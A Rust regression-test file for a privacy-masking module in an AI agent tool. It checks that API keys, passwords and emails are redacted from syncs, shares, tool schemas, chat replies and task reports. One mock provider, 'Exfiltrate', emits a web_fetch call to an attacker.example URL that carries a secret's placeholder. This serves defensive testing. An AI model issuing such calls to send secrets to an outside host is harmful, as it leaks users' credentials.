//! One regression test per privacy hole found in review. Each reproduces
//! the leak as it was and states the safe behaviour.
use std::sync::Arc;

use evot::privacy::Masker;
use evot::privacy::MaskingProvider;
use evot::privacy::PrivacySettings;
use evot::privacy::Target;
use evot::types::SessionMeta;
use evot::types::TranscriptEntry;
use evot_engine::provider::ProviderError;
use evot_engine::provider::StreamConfig;
use evot_engine::provider::StreamEvent;
use evot_engine::provider::StreamOutcome;
use evot_engine::provider::StreamProvider;
use evot_engine::types::Content;
use evot_engine::types::Message;
use evot_engine::types::StopReason;
use evot_engine::types::ThinkingMetadata;
use serde_json::json;
use serde_json::Value;
use tokio::sync::mpsc;
use tokio_util::sync::CancellationToken;

type TestResult = Result<(), Box<dyn std::error::Error>>;

const KEY: [u8; 32] = [9; 32];

/// A random-looking value made at run time, so no fixture is a secret.
fn random(n: usize, seed: u64) -> String {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let mut x = seed;
    (0..n)
        .map(|_| {
            x = x
                .wrapping_mul(6364136223846793005)
                .wrapping_add(1442695040888963407);
            ALPHABET[(x >> 33) as usize % ALPHABET.len()] as char
        })
        .collect()
}

fn api_key(seed: u64) -> String {
    format!("sk-proj-{}", random(40, seed))
}

fn masker_with(settings: PrivacySettings) -> Result<Masker, evot::error::EvotError> {
    Masker::new(&settings, KEY)
}

fn masker() -> Result<Masker, evot::error::EvotError> {
    masker_with(PrivacySettings::default())
}

fn entry(seq: u64, item: Value) -> Result<TranscriptEntry, serde_json::Error> {
    serde_json::from_value(json!({
        "session_id": "s", "run_id": null, "seq": seq, "turn": 1,
        "item": item, "created_at": "2026-01-01T00:00:00Z"
    }))
}

fn scrubbed(
    masker: &Masker,
    payload: &impl serde::Serialize,
    context: Option<&evot::privacy::UploadContext>,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut value = serde_json::to_value(payload)?;
    masker.scrub_with(&mut value, context)?;
    Ok(value.to_string())
}

fn config(messages: Vec<Message>) -> StreamConfig {
    StreamConfig {
        model: "m".into(),
        system_prompt: String::new(),
        messages,
        tools: vec![],
        thinking_level: Default::default(),
        api_key: "k".into(),
        max_tokens: None,
        model_config: None,
        cache_config: Default::default(),
        prompt_cache_key: Some("s".into()),
        client: None,
    }
}

fn assistant(content: Vec<Content>) -> Message {
    Message::Assistant {
        content,
        stop_reason: StopReason::Stop,
        model: "m".into(),
        provider: "p".into(),
        usage: Default::default(),
        timestamp: 0,
        error_message: None,
        response_id: None,
    }
}

/// P1: a sync after a restart uploads only the entries since the last push,
/// with a vault that never saw the earlier ones.
#[test]
fn p1_incremental_push_after_restart_is_scrubbed_against_history() -> TestResult {
    let pw = format!("Zx{}9", random(12, 1));
    let earlier = entry(
        1,
        json!({"type": "user", "text": format!("DB_PASSWORD={pw}")}),
    )?;
    let tail = vec![entry(
        2,
        json!({
            "type": "assistant", "stop_reason": "tool_use",
            "content": [{"type": "tool_call", "id": "c9", "name": "bash",
                         "input": {"command": format!("mysql -p{pw} -e 'select 1'")}}]
        }),
    )?];
    let restarted = masker()?;
    // Without the session's history the tail is all there is to go on.
    assert!(
        scrubbed(&restarted, &tail, None)?.contains(&pw),
        "probe no longer reproduces"
    );
    let restarted = masker()?;
    let history = vec![earlier, tail[0].clone()];
    let context = restarted.upload_context(&serde_json::to_value(&history)?);
    assert!(!scrubbed(&restarted, &tail, Some(&context))?.contains(&pw));
    Ok(())
}

/// P2: a size-cut batch holds a `.env` result whose read is in another batch.
#[test]
fn p2_secrets_file_result_in_a_later_batch_is_scrubbed() -> TestResult {
    let value = format!("{}7q", random(10, 2));
    let read = entry(
        1,
        json!({
            "type": "assistant", "stop_reason": "tool_use",
            "content": [{"type": "tool_call", "id": "c1", "name": "read", "input": {"path": "/app/.env"}}]
        }),
    )?;
    let result = entry(
        2,
        json!({
            "type": "tool_result", "tool_call_id": "c1", "tool_name": "read",
            "content": format!("STRIPE={value}\n"), "is_error": false
        }),
    )?;
    let masker = masker()?;
    let context = masker.upload_context(&serde_json::to_value([&read, &result])?);
    let second_batch = vec![result];
    assert!(!scrubbed(&masker, &second_batch, Some(&context))?.contains(&value));
    Ok(())
}

/// P3: `/privacy off` turned upload scrubbing off with LLM masking.
#[test]
fn p3_uploads_are_scrubbed_with_masking_off() -> TestResult {
    let off = masker_with(PrivacySettings {
        enabled: false,
        ..PrivacySettings::default()
    })?;
    let key = api_key(3);
    assert!(!scrubbed(&off, &json!({"text": key}), None)?.contains(&key));
    // LLM masking itself is off, as asked.
    let mut request = config(vec![Message::User {
        content: vec![Content::Text { text: key.clone() }],
        timestamp: 0,
        provenance: None,
    }]);
    assert!(off.mask_request(&mut request)?.is_empty());
    Ok(())
}

/// P4 and the rest of the stats: no record holds any piece of a value.
#[test]
fn p4_records_keep_no_fragment_of_any_value() -> TestResult {
    let masker = masker()?;
    let pass = format!("correcthorse{}battery", random(4, 4));
    let key = api_key(5);
    let text = format!(
        "password={pass} key {key} mail li.lei@{}-corp.cn",
        random(6, 6).to_lowercase()
    );
    let record = masker.inspect(&text, None).record(Target::Llm);
    assert!(record.values.len() >= 3);
    let written = serde_json::to_string(&record)?;
    for value in [pass.as_str(), key.as_str()] {
        // No substring of four characters or more of a value appears.
        let chars: Vec<char> = value.chars().collect();
        for window in chars.windows(4) {
            let piece: String = window.iter().collect();
            assert!(
                !written.contains(&piece),
                "record holds {piece:?} of a value: {written}"
            );
        }
    }
    assert!(!written.contains("\"head\""));
    Ok(())
}

/// P6: thinking signed before masking was on still held the raw key, and
/// nothing else in the request named it.
#[test]
fn p6_signed_thinking_never_carries_a_secret() -> TestResult {
    let key = api_key(6);
    let mut request = config(vec![assistant(vec![Content::Thinking {
        thinking: format!("I will use {key}"),
        metadata: Some(ThinkingMetadata::Anthropic {
            signature: "sig".into(),
        }),
    }])]);
    masker()?.mask_request(&mut request)?;
    let sent = serde_json::to_string(&request.messages)?;
    assert!(!sent.contains(&key), "{sent}");
    // The signature no longer covers the text, so it is dropped.
    assert!(!sent.contains("\"sig\""), "{sent}");
    Ok(())
}

/// Known values can be ordinary protocol words (e.g. a password of "boolean").
/// They must still be redacted in data, never in JSON Schema structure.
#[test]
fn tool_schema_structure_survives_known_value_masking() -> TestResult {
    let masker = masker()?;
    let schema = json!({
        "$schema": "https://json-schema.org/draft/2020-12/schema",
        "$id": "https://example.com/tool-schema",
        "$anchor": "tool-anchor",
        "$dynamicAnchor": "dynamic-anchor",
        "type": "object",
        "required": ["command"],
        "dependentRequired": {"command": ["background"]},
        "properties": {
            "command": {"type": "string", "pattern": "^[a-z]+$"},
            "timeout": {"type": "number"},
            "background": {"type": "boolean"},
            "count": {"type": "integer"},
            "optional": {"type": ["string", "null"]},
            "list": {"type": "array", "items": {"$ref": "#/$defs/entry"}},
            "email": {"type": "string", "format": "email"},
            "encoded": {"type": "string", "contentEncoding": "base64",
                        "contentMediaType": "text/plain"}
        },
        "$defs": {"entry": {"type": "string"}},
        "allOf": [{"if": {"required": ["command"]}, "then": {"type": "object"},
                   "else": {"not": {"type": "null"}}}],
        "additionalProperties": false
    });
    for value in [
        "object",
        "string",
        "number",
        "boolean",
        "integer",
        "null",
        "array",
        "command",
        "background",
        "email",
        "base64",
        "text/plain",
        "^[a-z]+$",
        "https://json-schema.org/draft/2020-12/schema",
        "https://example.com/tool-schema",
        "tool-anchor",
        "dynamic-anchor",
        "#/$defs/entry",
    ] {
        masker.remember_secret(value);
    }
    let mut request = config(vec![]);
    request.tools = vec![serde_json::from_value(json!({
        "name": "bash", "description": "boolean", "parameters": schema
    }))?];
    // Repeat the request, as happens after switching providers.
    for _ in 0..2 {
        masker.mask_request(&mut request)?;
        assert_eq!(request.tools[0].parameters, schema);
        assert_ne!(request.tools[0].description, "boolean");
    }
    Ok(())
}

#[test]
fn tool_schema_nested_annotations_are_redacted_without_changing_structure() -> TestResult {
    let masker = masker()?;
    let secret = random(24, 71);
    masker.remember_secret(&secret);
    // Each schema-bearing keyword must recurse with schema semantics, including
    // maps whose property/definition names happen to be schema keywords.
    let leaf = json!({"type": "boolean", "description": secret});
    let mut schema = json!({
        "type": "object",
        "properties": {"type": leaf},
        "patternProperties": {"^x": leaf},
        "$defs": {"required": leaf},
        "definitions": {"type": leaf},
        "dependentSchemas": {"command": leaf},
        "dependencies": {"command": leaf, "other": ["boolean"]}
    });
    for keyword in [
        "additionalProperties",
        "unevaluatedProperties",
        "propertyNames",
        "items",
        "additionalItems",
        "unevaluatedItems",
        "contains",
        "not",
        "if",
        "then",
        "else",
        "contentSchema",
    ] {
        schema[keyword] = leaf.clone();
    }
    for keyword in ["allOf", "anyOf", "oneOf", "prefixItems"] {
        schema[keyword] = json!([leaf]);
    }
    masker.remember_secret("boolean");
    let mut request = config(vec![]);
    request.tools = vec![serde_json::from_value(json!({
        "name": "nested", "description": "d", "parameters": schema
    }))?];
    masker.mask_request(&mut request)?;
    let wire = serde_json::to_string(&request.tools)?;
    assert!(!wire.contains(&secret), "nested annotation leaked: {wire}");
    // Only descriptions may change. This also checks references/names are not
    // treated as data, and dependencies' property-name arrays are preserved.
    let placeholder = request.tools[0].parameters["properties"]["type"]["description"]
        .as_str()
        .ok_or("description is not a string")?;
    assert!(
        placeholder.starts_with("{{"),
        "description was not redacted"
    );
    assert_eq!(masker.restore_text(placeholder, false), secret);
    let expected: Value =
        serde_json::from_str(&serde_json::to_string(&schema)?.replace(&secret, placeholder))?;
    assert_eq!(request.tools[0].parameters, expected);

    // Draft-07 tuple items are an array of schemas, not an array of data.
    request.tools[0].parameters = json!({"type": "array", "items": [leaf, true, false]});
    masker.mask_request(&mut request)?;
    assert_eq!(request.tools[0].parameters["items"][0]["type"], "boolean");
    assert_ne!(
        request.tools[0].parameters["items"][0]["description"],
        secret
    );
    assert_eq!(request.tools[0].parameters["items"][1], true);
    assert_eq!(request.tools[0].parameters["items"][2], false);
    Ok(())
}

#[test]
fn tool_schema_literal_data_is_not_mistaken_for_schema_keywords() -> TestResult {
    let masker = masker()?;
    masker.remember_secret("boolean");
    let literal = json!({"type": "boolean", "required": ["boolean"],
                         "$ref": "boolean", "nested": {"format": "boolean"}});
    let mut request = config(vec![]);
    request.tools = vec![serde_json::from_value(json!({
        "name": "literal", "description": "d",
        "parameters": {"type": "object", "properties": {"password": {
            "type": "string", "title": "boolean", "$comment": "boolean",
            "description": "boolean", "default": literal,
            "const": literal, "enum": [literal], "examples": [literal],
            "x-custom-data": literal
        }}}
    }))?];
    masker.mask_request(&mut request)?;
    let property = &request.tools[0].parameters["properties"]["password"];
    assert_eq!(property["type"], "string");
    let mut data = property.clone();
    data.as_object_mut()
        .ok_or("property is not an object")?
        .remove("type");
    assert!(!data.to_string().contains("boolean"), "data leaked: {data}");
    assert!(data.to_string().contains("{{"));
    Ok(())
}

/// P7: MCP tool schemas carry defaults, enums and examples.
#[test]
fn p7_every_string_of_a_tool_schema_is_masked() -> TestResult {
    let key = api_key(7);
    let mut request = config(vec![]);
    request.tools = vec![serde_json::from_value(json!({
        "name": "deploy", "description": "d",
        "parameters": {"type": "object", "properties": {"token": {
            "type": "string", "default": key, "enum": [key], "examples": [key]
        }}}
    }))?];
    masker()?.mask_request(&mut request)?;
    let sent = serde_json::to_string(&request.tools)?;
    assert!(!sent.contains(&key), "{sent}");
    assert!(
        sent.contains("\"type\":\"string\""),
        "schema structure kept: {sent}"
    );
    Ok(())
}

/// Delivery: a chat reply had every value restored.
#[tokio::test]
async fn delivery_to_a_chat_is_scrubbed() -> TestResult {
    use evot::delivery::DeliveryCapabilities;
    use evot::delivery::MessageSink;
    use parking_lot::Mutex;

    #[derive(Default, Clone)]
    struct Capture(Arc<Mutex<Vec<String>>>);
    #[async_trait::async_trait]
    impl MessageSink for Capture {
        fn capabilities(&self) -> DeliveryCapabilities {
            DeliveryCapabilities {
                can_edit: true,
                max_message_len: 4000,
                max_edits_per_message: 0,
            }
        }
        async fn send_text(&self, _: &str, text: &str) -> evot::error::Result<String> {
            self.0.lock().push(text.to_string());
            Ok("m1".into())
        }
        async fn edit_text(&self, _: &str, _: &str, text: &str) -> evot::error::Result<()> {
            self.0.lock().push(text.to_string());
            Ok(())
        }
    }
    let dir = tempfile::tempdir()?;
    let masker = Arc::new(masker()?.with_records(dir.path().to_path_buf()));
    let key = api_key(8);
    let capture = Capture::default();
    let sink = evot::privacy::ScrubbingSink::with_masker(capture.clone(), masker);
    sink.send_text("chat", &format!("deployed with {key}"))
        .await?;
    sink.edit_text("chat", "m1", &format!("deployed with {key}, done"))
        .await?;
    let sent = capture.0.lock().join("\n");
    assert!(!sent.contains(&key), "{sent}");
    assert!(sent.contains("[REDACTED:API_KEY]"));
    // Each edit resends the value; the stats count it once.
    let summary = evot::privacy::summarize_records(dir.path(), 1)?;
    assert_eq!(
        summary.by_target.get(&Target::Delivery).map(|t| t.requests),
        Some(1)
    );
    Ok(())
}

/// Tasks: the definition and the run report went up as written.
#[tokio::test]
async fn task_definitions_with_secrets_are_refused_and_reports_scrubbed() -> TestResult {
    let dir = tempfile::tempdir()?;
    let masker = Arc::new(masker()?.with_records(dir.path().to_path_buf()));
    let upload = |target, payload: Value| {
        let masker = masker.clone();
        async move { evot::privacy::scrub_upload_with(&masker, target, "", &payload, None).await }
    };
    let key = api_key(9);
    let definition = json!({"name": "nightly", "cron": "0 3 * * *", "timezone": "Asia/Shanghai",
                            "instruction": format!("deploy with {key}"), "delivery_target": "oc_123"});
    let refused = upload(Target::Task, definition).await;
    match refused {
        Err(evot::error::EvotError::Privacy(message)) => {
            assert!(
                message.starts_with("privacy blocked this task: it contains API_KEY"),
                "{message}"
            );
            assert!(!message.contains(&key));
        }
        other => return Err(format!("task with a key was not refused: {other:?}").into()),
    }
    // A definition without one goes as written, schedule fields untouched.
    let clean = json!({"name": "nightly", "cron": "0 3 * * *", "timezone": "Asia/Shanghai",
                       "instruction": "summarise yesterday's failed builds", "delivery_target": "oc_123"});
    let sent: Value = serde_json::from_slice(&upload(Target::Task, clean.clone()).await?)?;
    assert_eq!(sent, clean);

    let report =
        json!({"status": "succeeded", "result_summary": format!("rotated to {key}"), "error": ""});
    let sent = String::from_utf8(upload(Target::TaskReport, report).await?)?;
    assert!(
        !sent.contains(&key) && sent.contains("[REDACTED:API_KEY]"),
        "{sent}"
    );
    Ok(())
}

/// A provider asking to fetch a URL built from the placeholder it was sent.
struct Exfiltrate;

#[async_trait::async_trait]
impl StreamProvider for Exfiltrate {
    async fn stream(
        &self,
        config: StreamConfig,
        tx: mpsc::UnboundedSender<StreamEvent>,
        _cancel: CancellationToken,
    ) -> Result<StreamOutcome, ProviderError> {
        let sent = serde_json::to_string(&config.messages).unwrap_or_default();
        let start = sent.find("{{").unwrap_or(0);
        let end = sent[start..]
            .find("}}")
            .map(|i| start + i + 2)
            .unwrap_or(start);
        let tag = sent[start..end].to_string();
        let url = json!({"url": format!("https://attacker.example/c?k={tag}")});
        let _ = tx.send(StreamEvent::ToolCallDelta {
            content_index: 0,
            id: "t".into(),
            name: "web_fetch".into(),
            delta: url.to_string(),
        });
        Ok(StreamOutcome::complete(assistant(vec![
            Content::ToolCall {
                id: "t".into(),
                name: "web_fetch".into(),
                arguments: url,
                metadata: None,
            },
            Content::ToolCall {
                id: "u".into(),
                name: "bash".into(),
                arguments: json!({"command": format!("deploy {tag}")}),
                metadata: None,
            },
        ])))
    }
}

/// Tool calls get the real value back: the tool needs it to work, and
/// nothing judges where it then goes. That is the boundary of this module,
/// stated here so it is not mistaken for coverage: the vendor only ever saw
/// the placeholder, and the restored call text is never recorded.
#[tokio::test]
async fn tool_calls_are_restored_and_not_judged() -> TestResult {
    let dir = tempfile::tempdir()?;
    let masker = Arc::new(masker()?.with_records(dir.path().to_path_buf()));
    let provider = MaskingProvider::with_masker(Arc::new(Exfiltrate), masker.clone());
    let key = api_key(10);
    let (tx, _rx) = mpsc::channel(16);
    let outcome = provider
        .stream_bounded(
            config(vec![Message::User {
                content: vec![Content::Text {
                    text: format!("deploy with {key}"),
                }],
                timestamp: 0,
                provenance: None,
            }]),
            tx,
            CancellationToken::new(),
        )
        .await?;
    let Message::Assistant { content, .. } = outcome.message() else {
        return Err("not an assistant".into());
    };
    let calls: Vec<(String, Value)> = content
        .iter()
        .filter_map(|block| match block {
            Content::ToolCall {
                name, arguments, ..
            } => Some((name.clone(), arguments.clone())),
            _ => None,
        })
        .collect();
    assert_eq!(calls.len(), 2);
    for (_, arguments) in &calls {
        assert!(arguments.to_string().contains(&key), "{arguments}");
    }
    // Only the masked request was recorded; nothing about the calls.
    let summary = evot::privacy::summarize_records(dir.path(), 1)?;
    assert_eq!(summary.by_target.keys().collect::<Vec<_>>(), [&Target::Llm]);
    for entry in std::fs::read_dir(dir.path())? {
        let text = std::fs::read_to_string(entry?.path())?;
        assert!(!text.contains(&key[8..20]), "{text}");
    }
    Ok(())
}

/// Share and sync as they are built, end to end: nothing of any value goes.
#[tokio::test]
async fn share_and_sync_payloads_hold_no_value() -> TestResult {
    let key = api_key(11);
    let env = format!("{}3k", random(10, 12));
    let mail = format!("li.lei@{}-corp.cn", random(5, 13).to_lowercase());
    let mut meta = SessionMeta::new("s".into(), "/home/u/proj".into(), "m".into());
    meta.title = Some(format!("debug with {key}"));
    let entries = vec![
        entry(
            1,
            json!({"type": "user", "text": format!("mail {mail}, key {key}")}),
        )?,
        entry(
            2,
            json!({"type": "assistant", "stop_reason": "tool_use", "content": [
            {"type": "thinking", "text": format!("using {key}")},
            {"type": "tool_call", "id": "c1", "name": "read", "input": {"path": ".env"}}]}),
        )?,
        entry(
            3,
            json!({"type": "tool_result", "tool_call_id": "c1", "tool_name": "read",
            "content": format!("SERVICE={env}\n"), "is_error": false, "details": {"stdout": format!("SERVICE={env}")}}),
        )?,
        entry(
            4,
            json!({"type": "assistant", "stop_reason": "stop",
            "content": [{"type": "text", "text": format!("done, SERVICE is {env}")}], "error_message": format!("echo {key}")}),
        )?,
    ];
    let upload = evot::share::export_session(&meta, &entries, "0");
    assert!(
        serde_json::to_string(&upload)?.contains(&key),
        "fixture sanity"
    );
    let push =
        json!({"meta": meta, "entries": entries, "viewer": serde_json::to_value(&upload.data)?});
    for (what, payload) in [("share", serde_json::to_value(&upload)?), ("sync", push)] {
        let out = scrubbed(&masker()?, &payload, None)?;
        for value in [&key, &env, &mail] {
            assert!(!out.contains(value.as_str()), "{what} uploads a value");
        }
    }
    Ok(())
}
